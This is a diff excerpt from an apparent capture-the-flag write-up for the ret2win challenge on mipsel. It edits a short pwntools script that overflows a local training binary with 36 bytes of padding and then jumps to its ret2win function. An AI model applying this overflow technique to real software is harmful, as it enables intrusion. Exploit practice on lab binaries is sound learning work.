@@ -223,13 +223,13 @@ log.info(p.recvall())
 # mipsel (32 bit) architecture
 Same 36 bytes offset same payload
 
-```
+```python
 from pwn import *
 context.binary = elf = ELF('./ret2win_mipsel')
 
 p = elf.process()
 
-offset = 4*9
+offset = 36
 payload = b'f'*offset+p32(elf.sym['ret2win'])
 
 p.recv()
